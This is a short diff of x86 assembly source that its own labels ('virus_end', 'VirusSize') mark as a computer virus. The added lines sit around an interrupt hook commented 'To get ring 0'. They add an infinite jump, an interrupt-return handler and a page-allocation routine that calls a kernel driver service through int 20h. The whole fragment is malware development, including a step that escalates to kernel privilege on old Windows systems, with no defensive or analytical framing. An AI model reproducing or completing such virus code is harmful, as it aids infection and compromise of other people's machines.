@@ -177,12 +177,27 @@ shr esi, 16
 mov [ebx+2h], si
 pop esi
 
+
 int HookExceptionNumber    ; To get ring 0
+
+jmp $
 
 ExceptionOccured:
 
 
 IntHandler:
+iret
+
+Allocate_Page:
+mov eax, 01h
+xor ebx, ebx
+mov ecx, 01h
+mov edx, 02h
+xor esi, esi
+mov edi, esi
+int 20h
+dd 00010053h
+ret
 
 virus_end:
 VirusSize equ $
